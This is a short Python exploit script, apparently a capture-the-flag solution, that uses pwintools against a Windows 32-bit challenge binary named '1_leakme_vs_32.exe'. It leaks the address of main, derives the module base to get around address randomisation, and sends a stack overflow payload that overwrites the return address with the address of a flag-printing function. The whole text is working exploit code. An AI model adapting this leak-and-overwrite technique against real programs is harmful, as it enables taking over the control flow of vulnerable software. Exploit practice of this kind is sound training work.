#

from pwintools import *

retAddrOffs = 60

OFFS_MAIN = 0x1020
OFFS_PRINT_FLAG = 0x1000


# main

p = Process('1_leakme_vs_32.exe')

# p.set_timeout(3600000) # to have time to interact with the debugger
# input('press enter after attaching the debugger...')

p.recvuntil(b'quit\r\n')
p.sendline(b'5')

p.recvuntil(b'name: ')
leak = p.recvuntil(b'\r\n')

leak = leak[:-2][:4]
leak = leak + b'\x00'*(4 - len(leak)) # pad with zeroes if fewer than 4 bytes

mainAddr = u32(leak)
baseAddr = mainAddr - OFFS_MAIN
printFlagAddr = baseAddr + OFFS_PRINT_FLAG

print('got:', leak, hex(mainAddr), hex(baseAddr), hex(printFlagAddr))

p.sendline(b'-1  ' + b'a'*(retAddrOffs-4) + p32(printFlagAddr))

p.interactive()
